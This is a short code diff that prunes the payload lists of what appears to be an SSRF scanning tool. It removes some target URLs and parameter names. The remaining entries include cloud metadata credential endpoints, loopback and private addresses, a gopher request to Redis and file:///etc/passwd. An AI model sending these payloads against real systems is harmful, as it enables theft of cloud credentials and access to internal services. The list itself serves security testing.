@@ -11,7 +11,6 @@ TARGETS = [
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     # GCP
     "http://metadata.google.internal/computeMetadata/v1/",
-    "http://169.254.169.254/computeMetadata/v1/",
     # Azure
     "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     # Alibaba
@@ -21,14 +20,10 @@ TARGETS = [
     # Internal services
     "http://127.0.0.1/",
     "http://localhost/",
-    "http://0.0.0.0/",
-    "http://[::1]/",
     "http://192.168.0.1/",
     "http://10.0.0.1/",
-    "http://172.16.0.1/",
     # Protocol smuggling
     "gopher://127.0.0.1:6379/_INFO",
-    "dict://127.0.0.1:11211/stat",
     "file:///etc/passwd",
 ]
 
@@ -43,8 +38,6 @@ SSRF_INDICATORS = (
 PARAMS = [
     "url", "next", "redirect", "dest", "target", "uri", "callback",
     "path", "src", "source", "href", "link", "image", "file", "doc",
-    "page", "feed", "host", "site", "to", "out", "view", "dir", "show",
-    "navigation", "return", "returnTo", "return_to", "goto", "jump",
 ]
 
 
